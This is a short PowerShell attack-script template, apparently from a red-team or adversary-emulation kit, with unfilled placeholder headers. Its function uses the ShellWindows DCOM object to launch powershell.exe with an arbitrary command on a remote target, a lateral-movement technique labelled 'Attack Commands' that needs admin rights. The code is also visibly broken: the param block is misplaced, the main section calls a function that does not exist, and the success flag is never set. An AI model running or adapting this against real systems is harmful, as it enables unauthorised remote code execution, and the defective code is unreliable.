#Title: Name-function
#Technique: ID Tech
#Tactic: ID Tactic

function invoke-dcom-shellExecute
    {
    <#
    .SYNOPSIS
    
    .DESCRIPTION
    Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)

    .LINK

    
    #>
    $good = $false
    $results = $null

    param(
        [String] $instruction,
        [String] $target

    )
    $clsid = "9BA05972-F6A8-11CF-A442-00A0C90A8F39"
    $obj = [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($clsid, $target))
    $obj.item().Document.Application.ShellExecute("powershell.exe", "/C $instruction", "c:\windows\system32", $null, 0)


    return @{results=$results;success=$good}
    }


#Main program
$execute = {
  
}

#GiveMeData if needed

#get-credentials
$execute = invoke-namefunction

#PutData if needed
  # if($execute.success)
  # {
    
  # }

return @{results=$execute.results;success=$execute.success}